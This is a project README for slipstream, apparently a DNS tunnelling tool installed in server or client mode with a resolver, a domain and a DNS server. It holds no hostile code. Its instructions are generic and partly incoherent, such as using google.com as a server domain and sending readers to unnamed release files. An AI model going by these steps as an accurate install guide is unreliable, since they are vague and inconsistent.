# 🌊 slipstream - Seamlessly Install on Server and Client

[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/DoraOtari/slipstream/releases)

## 📄 Description
slipstream helps you install the application on both server and client sides with ease. Its simple use allows you to manage installations effortlessly, making network setup straightforward.

## 🛠️ Requirements
- **Operating System:** Ubuntu 24.04

## 🚀 Getting Started
To get started with slipstream, you'll need to visit the Releases page to download the latest version. Follow the step-by-step instructions below to install and run the software successfully.

[Visit the Download Page](https://github.com/DoraOtari/slipstream/releases)

## 📥 Download & Install
1. **Visit the Releases Page:** 
   Click on this link to go to the [download page](https://github.com/DoraOtari/slipstream/releases). Look for the latest version.

2. **Download the Files:** 
   You will find several files listed. Choose the file that suits your setup needs. Download it to your computer.

3. **Prepare Your System:**
   Make sure your system is updated. Open a terminal and run the following command:
   ```bash
   sudo apt update
   sudo apt upgrade
   ```

4. **Extract the Files:**
   Navigate to the directory where you downloaded the files. If you downloaded a compressed file, extract it using:
   ```bash
   tar -xzf filename.tar.gz
   ```

5. **Run the Installation Script:**
   To install slipstream, run the following command in the terminal. You need to choose between `server` or `client` installation. Here’s the command format:
   ```bash
   bash install.sh [server|client] client-port resolver-IP:resolver-Port domain dns-server
   ```

### Example Command for Server Installation:
   ```bash
   bash install.sh server 7000 172.16.2.69:53 google.com 1.1.1.1
   ```

### Example Command for Client Installation:
   ```bash
   bash install.sh client 8000 172.16.2.69:53 clientdomain.com 1.1.1.1
   ```

6. **Confirmation of Installation:**
   Once the installation completes, you should see a confirmation message. You can now start using slipstream.

## 🔍 Troubleshooting
If you encounter any issues during the installation process, try the following:

- Ensure you are using **Ubuntu 24.04**.
- Double-check the command options for typos.
- Verify your network settings, especially your resolver IP and ports.

If problems persist, check the README or seek support in community forums related to slipstream.

## 📧 Get Help
For any questions or further assistance, feel free to reach out via the issues section on the GitHub repository. Our team is happy to help you get the most out of slipstream.

## 🔗 Additional Resources
- [GitHub Repository](https://github.com/DoraOtari/slipstream)
- Check the **Wiki** for more detailed guides and common configurations.

Thank you for choosing slipstream! We hope it makes your network setup easier than ever.